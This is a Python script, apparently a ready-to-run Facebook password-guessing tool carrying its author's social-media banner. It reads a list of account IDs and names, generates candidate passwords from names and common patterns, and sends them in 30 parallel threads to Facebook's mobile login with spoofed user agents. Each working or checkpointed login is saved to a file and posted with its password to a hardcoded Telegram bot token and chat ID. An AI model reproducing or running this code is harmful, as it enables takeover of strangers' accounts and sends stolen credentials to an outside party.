import os
try:
  import requests
  from user_agent import generate_user_agent
  from rich.panel import Panel
  from rich import print as Hj
  import time
  import random
  import os
  from bs4 import BeautifulSoup
  import sys
  from concurrent.futures import ThreadPoolExecutor as tred
except:
  os.system("pip install requests user_agent rich bs4")
  os.system("clear")
  
import requests
from user_agent import generate_user_agent
from rich.panel import Panel
from rich import print as Hj
import time
import random
import os
from bs4 import BeautifulSoup
import sys
from concurrent.futures import ThreadPoolExecutor as tred

E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'

def nx():
    os.system("clear")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] YouTube    : {B}| أحمد الحراني 
|{F}[+] TeleGram   : {B} maho_s9    
|{F}[+] Instagram  : {B} ahmedalharrani 
|{F}[+] Tool       : {B} Facebook File
{E}==============================
"""
    for mm in Banner.splitlines():
        time.sleep(0.05)
        print(mm)

nx()

token = '6633268373:AAH4_4GL7TGvg3FGfnijhHy7-X4uS2K0pkQ'
print(X + ' ═════════════════════════════════  ')
ID = '6294996199'

os.system('clear')

ok, cp, ee, us = 0, 0, 0, 0




def dalvik():
    vr = ["1.6.0", "2.1.0", "2.1.2"]
    an = ["7.0", "8.1", "9", "10", "11", "12", "13"]
    dev = [
        "SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", "Nexus 6", 
        "OnePlus 7T", "HUAWEI P30", "Xiaomi Mi 9", "Redmi Note 8", "OPPO Reno2"
    ]
    sos = [
        "QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", 
        "NRD90M", "QKQ1.190910.002", "LMY47V"
    ]
    nano = random.choice(vr)  
    com = random.choice(an)
    mod = random.choice(dev)
    lp = random.choice(sos)
    user_agent = f"Dalvik/{nano} (Linux; U; Android {com}; {mod} Build/{lp})"
    
    return user_agent


def Users(browser_type=random.choice(['chrome', 'kiwi', 'brave', 'edge'])):
    
    lop = ["9", "10", "11", "12", "13", "14"]
    
    sms = [
        "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21",
        "Samsung Galaxy S22", "Samsung Galaxy Note 20", "OnePlus 9", "OnePlus 10 Pro",
        "Xiaomi Mi 11", "Huawei P40", "Sony Xperia 1 III"
    ]
    
    ml = random.randint(89, 117)  
    oop = random.randint(537, 540)
    
    mmk = random.choice(lop)
    awq = random.choice(sms)
    
    
    if browser_type == "chrome":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
    
    elif browser_type == "kiwi":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Kiwi/{ml}.0.0.0 Mobile Safari/{oop}.36"
    
    elif browser_type == "brave":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 Brave/{ml}.0.0.0"
    
    elif browser_type == "edge":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 EdgA/{ml}.0.0.0"
    
    return user_agent


def IOS():
    los = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
    dec = [
        "iPhone12,1",  
        "iPhone12,3",  
        "iPhone13,4",  
        "iPhone14,2",  
        "iPhone14,5",  
        "iPhone15,2",  
        "iPad8,1",     
        "iPad8,9",     
        "iPad11,6",
    ]       
    web = random.randint(600, 605)
    sf = random.randint(14, 17)   
    nok = random.choice(los)
    mod = random.choice(dec)
    
    user_agent = f"Mozilla/5.0 (iPhone; CPU iPhone OS {nok.replace('.', '_')} like Mac OS X) AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
    
    return user_agent



def logo():
    blue = "\033[94m"  
    white = "\033[97m" 
    reset = "\033[0m"  

    print(f"{blue}  ************* ")
    print(f"{blue} *             * ")
    print(f"{blue} * {white}  FFFFFFF  {blue} * ")
    print(f"{blue} * {white}  FFF      {blue} * ")
    print(f"{blue} * {white}  FFF      {blue} * ")
    print(f"{blue} * {white}  FFFFFFF  {blue} * ")
    print(f"{blue} * {white}  FFF      {blue} * ")
    print(f"{blue} * {white}  FFF      {blue} * ")
    print(f"{blue} * {white}  FFF      {blue} * ")
    print(f"{blue} *             * ")
    print(f"{blue}  ************* {reset}")


logo()




def Facebook(idf, pw):
    global ok, cp, ee, us
    while True:
      try:
        agent = random.choice([IOS(), Users(), dalvik(), generate_user_agent()])
        session = requests.Session()
        url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=ar_AR&refid=8"
        headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23127PN0CC"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': agent,
    'viewport-width': '980',
}

        response = session.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        hidden_inputs = soup.find_all("input", type="hidden")
        data = {input.get('name'): input.get('value') for input in hidden_inputs if input.get('name')}
        data['email'] = idf
        data['pass'] = pw

        req = session.post(url, data=data, headers=headers, allow_redirects=False)
        
        
        if "m_page_voice" in req.cookies:
            ok += 1
            Hj(Panel(f' \t[green][OK] ID => {idf} | Password => {pw}'))       
            sys.stdout.write(f"\r \033[31m [ BAD ] | {ee} \033[33m [ CP ]| {cp}\033[32m [OK] [{ok}] \033[35m [BadUserAgent: {us}] \r")
                
            
            tlg = f''' حساب صحيح ✅
────────⧏ مهوس⧐────────
✵ -  USERNAM : {idf}
✵ -  PASSWRD : {pw}
────────⧏ مهوس ⧐────────
@maho_s9 • '''
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
            
            with open('OK.txt', 'a') as f:
                f.write(tlg + '\n')
            break
        elif "Unsupported Browser" in req.text or "<title>Error Facebook</title>" in req.text or "خطأ" in req.text:
            us += 1
            sys.stdout.write(f"\r \033[31m [ BAD ] | {ee} \033[33m [ CP ]| {cp}\033[32m [OK] [{ok}] \033[35m [BadUserAgent: {us}] \r")
                
        elif "checkpoint" in req.cookies:
            cp += 1
            Hj(Panel(f' \t[yellow][CP] ID => {idf} | Password => {pw}'))
            sys.stdout.write(f"\r \033[31m [ BAD ] | {ee} \033[33m [ CP ]| {cp}\033[32m [OK] [{ok}] \033[35m [BadUserAgent: {us}] \r")
                          
            tlg = f''' حساب سڪيور ❌
────────⧏ مهوس⧐────────
✵ -  USERNAM : {idf}
✵ -  PASSWRD : {pw}
────────⧏ مهوس ⧐────────
@maho_s9 • '''
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
            
            with open('CP.txt', 'a') as f:
                f.write(tlg + '\n')
            break
        else:            
            ee += 1
            sys.stdout.write(f"\r \033[31m [ BAD ] | {ee} \033[33m [ CP ]| {cp}\033[32m [OK] [{ok}] \033[35m [BadUserAgent: {us}] \r")
                
            break
      except:
        ee += 1
        sys.stdout.write(f"\r \033[31m [ BAD ] | {ee} \033[33m [ CP ]| {cp}\033[32m [OK] [{ok}] \033[35m [BadUserAgent: {us}] \r")
                
        pass
        
def Password():
    try:
        file = input("ENTER YOUR FILE NAME - اكتب اسم الملـف الايديات او المسار : ")
        with open(file, "r") as id2:
            lines = id2.readlines()
    except:
        Password()

    with tred(max_workers=30) as pool:
        for ssl in lines:
            idf = ssl.split('|')[0].strip()
            nmf = ssl.split('|')[1].strip().lower()
            frs = nmf.split(' ')[0].strip()
            pwv = []

            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs + frs)
                    pwv.append(frs + ' ' + frs)                    
                    pwv.append('1122334455@@')
                    pwv.append('Aa123456')
                    pwv.append('734707298')
                    pwv.append('mmmmnnnn')
                    pwv.append('nnnnmmmm')
                    pwv.append('mmnnbbvv')
                    pwv.append('zzzzxxxx')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('12345@12345')
                    pwv.append('123@123')
                    pwv.append('1234512345')
                    pwv.append('123412345')
                    pwv.append('1234554321')
                    pwv.append('00998877')
                    pwv.append('123456123456')
                    pwv.append('1122334455')
                    pwv.append('1q2w3e4r5t')
                    pwv.append('1q2w3e4r5t6y')
                    pwv.append('1020304050')
                    pwv.append('20222022')
                    pwv.append('aassddff')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
                    pwv.append('qqwweerr')
                    pwv.append('mmnnbbvv')
                    pwv.append('aassddffgg')
                    pwv.append('aassddff')
                    pwv.append('1020304050')
                    pwv.append('10203040')
                    pwv.append('1234554321')
                    pwv.append('1234512345')
                    pwv.append('20082008')
                    pwv.append('20202020')
                    pwv.append('20212021')
                                       
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append('19901990')
                pwv.append('734707298')
                pwv.append('19911991')
                pwv.append('19921992')
                pwv.append('19931993')
                pwv.append('19941994')
                pwv.append('19951995')
                pwv.append('19961996')
                pwv.append('19971997')
                pwv.append('19981998')
                pwv.append('19991999')
                pwv.append('qqwweerr')
                pwv.append('mmnnbbvv')
                pwv.append('aassddffgg')
                pwv.append('aassddff')
                pwv.append('1020304050')
                pwv.append('10203040')
                pwv.append('123554321')
                pwv.append('1234512345')
                pwv.append('20082008')
                pwv.append('20202020')
                pwv.append('20212021')
                pwv.append('qqwweerrtt')
                pwv.append('qqwweerrttyy')
                pwv.append('zzxxccvvbbnnmm')
                pwv.append('aassddffgghhjjkkll')
            for pw in pwv:
                pool.submit(Facebook, idf, pw)


Password()
